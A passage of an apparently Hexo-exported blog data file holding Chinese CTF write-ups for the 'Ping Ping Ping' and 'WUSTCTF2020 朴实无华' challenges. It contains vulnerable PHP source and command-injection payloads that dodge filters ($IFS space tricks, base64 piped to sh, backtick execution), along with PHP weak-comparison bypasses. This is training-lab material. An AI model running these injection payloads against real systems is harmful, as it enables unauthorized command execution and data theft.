print_r($a);\n}\n\n?>\n```\n\n一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问**flag.php**。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用**readflag**的ELF执行文件访问，但是还没成功。其实执行：\n\n```\n?ip=|cat$IFS`ls`\n```\n\n这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了<span class='heimu'>我是傻逼</span>。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205110806.png)\n\n**最后记录下学到的姿势和这道题目的其他思路**：\n\n* 管道符：\n  * `|`直接执行后面的语句。\n  * `||`如果前面语句错误，执行后面的语句。\n  * `&`前面和后面命令都要执行，无论前面真假，\n  * `&&`如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令\n\n* 使用以下绕过空格：\n\n```\n$IFS\n${IFS}\n${IFS}$1\n$IFS$1 //$1改成$加其他数字貌似都行\n<\n<> \n{cat,flag.php}  //用逗号实现了空格功能\n%20 \n%09 //需要php环境\n```\n\n* 覆盖源码里的`$a`变量（拼接变量）：\n\n```\n/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php\n```\n\n* 使用sh执行脚本：\n\n```\n/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh\n```\n\n* 内联执行：\n\n```\n/?ip=|cat$IFS`ls`\n```\n\n>附：大佬整理的博客（内含更多姿势）：[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)","slug":"[GXYCTF2019]Ping Ping Ping","published":1,"updated":"2021-12-30T09:42:54.199Z","_id":"ckrr3f9b0000xhotc2ez49owo","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h1><p>题目链接：<a href=\"https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\">https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping</a></p>\n<p>和DMCTF做的那道<strong>pingpingping</strong>类似，同样是使用管道符构造payload，先使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>\n\n<p>目录下有两个文件：<code>flag.php</code>、<code>index.php</code>。首先试出来了空格被过滤，使用以下绕过空格：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$IFS</span><br><span class=\"line\">$&#123;IFS&#125;</span><br><span class=\"line\">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class=\"line\">&lt; </span><br><span class=\"line\">&lt;&gt; </span><br><span class=\"line\">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class=\"line\">%20 </span><br><span class=\"line\">%09 </span><br></pre></td></tr></table></figure>\n\n<p>在linux下反单引号里面的指令会被执行 <strong>`ls`</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<p>会输出该目录下所有可以打开的文件，可以查看<strong>index.php</strong>的部分源码有哪些过滤：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=|\\<span class=\"string\">&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your space!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your bash!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your flag!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class=\"line\"><span class=\"string\">  echo &quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;;</span></span><br><span class=\"line\"><span class=\"string\">  print_r($a);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问<strong>flag.php</strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用<strong>readflag</strong>的ELF执行文件访问，但是还没成功。其实执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了<span class='heimu'>我是傻逼</span>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205110806.png\"></p>\n<p><strong>最后记录下学到的姿势和这道题目的其他思路</strong>：</p>\n<ul>\n<li><p>管道符：</p>\n<ul>\n<li><code>|</code>直接执行后面的语句。</li>\n<li><code>||</code>如果前面语句错误，执行后面的语句。</li>\n<li><code>&amp;</code>前面和后面命令都要执行，无论前面真假，</li>\n<li><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li>\n</ul>\n</li>\n<li><p>使用以下绕过空格：</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$IFS</span><br><span class=\"line\">$&#123;IFS&#125;</span><br><span class=\"line\">$&#123;IFS&#125;$1</span><br><span class=\"line\">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class=\"line\">&lt;</span><br><span class=\"line\">&lt;&gt; </span><br><span class=\"line\">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class=\"line\">%20 </span><br><span class=\"line\">%09 //需要php环境</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>覆盖源码里的<code>$a</code>变量（拼接变量）：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用sh执行脚本：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>内联执行：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>附：大佬整理的博客（内含更多姿势）：<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h1><p>题目链接：<a href=\"https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\">https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping</a></p>\n<p>和DMCTF做的那道<strong>pingpingping</strong>类似，同样是使用管道符构造payload，先使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>\n\n<p>目录下有两个文件：<code>flag.php</code>、<code>index.php</code>。首先试出来了空格被过滤，使用以下绕过空格：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$IFS</span><br><span class=\"line\">$&#123;IFS&#125;</span><br><span class=\"line\">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class=\"line\">&lt; </span><br><span class=\"line\">&lt;&gt; </span><br><span class=\"line\">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class=\"line\">%20 </span><br><span class=\"line\">%09 </span><br></pre></td></tr></table></figure>\n\n<p>在linux下反单引号里面的指令会被执行 <strong>`ls`</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<p>会输出该目录下所有可以打开的文件，可以查看<strong>index.php</strong>的部分源码有哪些过滤：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=|\\<span class=\"string\">&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your space!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your bash!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class=\"line\"><span class=\"string\">    die(&quot;fxck your flag!&quot;);</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class=\"line\"><span class=\"string\">  echo &quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;;</span></span><br><span class=\"line\"><span class=\"string\">  print_r($a);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问<strong>flag.php</strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用<strong>readflag</strong>的ELF执行文件访问，但是还没成功。其实执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了<span class='heimu'>我是傻逼</span>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205110806.png\"></p>\n<p><strong>最后记录下学到的姿势和这道题目的其他思路</strong>：</p>\n<ul>\n<li><p>管道符：</p>\n<ul>\n<li><code>|</code>直接执行后面的语句。</li>\n<li><code>||</code>如果前面语句错误，执行后面的语句。</li>\n<li><code>&amp;</code>前面和后面命令都要执行，无论前面真假，</li>\n<li><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li>\n</ul>\n</li>\n<li><p>使用以下绕过空格：</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$IFS</span><br><span class=\"line\">$&#123;IFS&#125;</span><br><span class=\"line\">$&#123;IFS&#125;$1</span><br><span class=\"line\">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class=\"line\">&lt;</span><br><span class=\"line\">&lt;&gt; </span><br><span class=\"line\">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class=\"line\">%20 </span><br><span class=\"line\">%09 //需要php环境</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>覆盖源码里的<code>$a</code>变量（拼接变量）：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用sh执行脚本：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>内联执行：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?ip=|cat$IFS`ls`</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>附：大佬整理的博客（内含更多姿势）：<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a></p>\n</blockquote>\n"},{"title":"WUSTCTF2020 朴实无华","date":"2021-04-16T07:33:32.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232246.png","_content":"\n进入页面直接报错\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416103737.png)\n\n试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容\n\n> User-agent: *\n> Disallow: /fAke_f1agggg.php\n\n访问`fAke_f1agggg.php`并且抓包，在响应头里有提示。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416105630.png)\n\n访问`fl4g.php`才正式开始，源码如下：\n\n```php\n<img src=\"/img.jpg\">\n<?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(intval($num) < 2020 && intval($num + 1) > 2021){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n//level 2\nif (isset($_GET['md5'])){\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\";\n   else\n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n?>\n```\n\n一关一关的**bypass**。\n\n第一关\n\n重点在`intval`函数，intval函数有个特性:\n\n>  直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换\n\n这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload`2e9`，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了`$num + 1`会进行类型转换，2e9会先使用科学计数法计算出值并+1。\n\n第二关\n\n需要一个md5值，对这个值再次使用md5加密以后，使用**弱类型**比较，和原来的值相同。md5的一个弱类型比较绕过：\n\n> PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。\n\n使用脚本跑一下得到一个值：`0e215962017`。\n\n最后一层，是一个`system`函数执行，但是在之前有一些过滤\n\n* `strstr`函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)）\n* `str_ireplace`会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。\n\n先使用ls查看下当前目录下的文件，发现一个名为`fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`读取得到flag。\n\n最终payload：\n\n```url\n/fl4g.php?num=2e9&md5=0e215962017&get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n","source":"_posts/[WUSTCTF2020]朴实无华.md","raw":"---\ntitle: WUSTCTF2020 朴实无华\ndate: 2021-04-16 15:33:32\ncategories: \n- CTF\ntags: \n- RCE\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232246.png\n---\n\n进入页面直接报错\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416103737.png)\n\n试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容\n\n> User-agent: *\n> Disallow: /fAke_f1agggg.php\n\n访问`fAke_f1agggg.php`并且抓包，在响应头里有提示。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416105630.png)\n\n访问`fl4g.php`才正式开始，源码如下：\n\n```php\n<img src=\"/img.jpg\">\n<?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(intval($num) < 2020 && intval($num + 1) > 2021){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n//level 2\nif (isset($_GET['md5'])){\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\";\n   else\n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);\n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\";\n        system($get_flag);\n    }else{\n        die(\"快到非洲了\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n?>\n```\n\n一关一关的**bypass**。\n\n第一关\n\n重点在`intval`函数，intval函数有个特性:\n\n>  直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换\n\n这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload`2e9`，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了`$num + 1`会进行类型转换，2e9会先使用科学计数法计算出值并+1。\n\n第二关\n\n需要一个md5值，对这个值再次使用md5加密以后，使用**弱类型**比较，和原来的值相同。md5的一个弱类型比较绕过：\n\n> PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。\n\n使用脚本跑一下得到一个值：`0e215962017`。\n\n最后一层，是一个`system`函数执行，但是在之前有一些过滤\n\n* `strstr`函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)）\n* `str_ireplace`会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。\n\n先使用ls查看下当前目录下的文件，发现一个名为`fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`读取得到flag。\n\n最终payload：\n\n```url\n/fl4g.php?num=2e9&md5=0e215962017&get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n","slug":"[WUSTCTF2020]朴实无华","published":1,"updated":"2021-12-30T09:42:54.200Z","_id":"ckrr3f9b10010hotc42pd7wo7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>进入页面直接报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416103737.png\"></p>\n<p>试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容</p>\n<blockquote>\n<p>User-agent: *<br>Disallow: /fAke_f1agggg.php</p>\n</blockquote>\n<p>访问<code>fAke_f1agggg.php</code>并且抓包，在响应头里有提示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416105630.png\"></p>\n<p>访问<code>fl4g.php</code>才正式开始，源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;/img.jpg&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__file__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(intval(<span class=\"variable\">$num</span>) &lt; <span class=\"number\">2020</span> &amp;&amp; intval(<span class=\"variable\">$num</span> + <span class=\"number\">1</span>) &gt; <span class=\"number\">2021</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//level 2</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>]))&#123;</span><br><span class=\"line\">   <span class=\"variable\">$md5</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>];</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span>==md5(<span class=\"variable\">$md5</span>))</span><br><span class=\"line\">       <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span 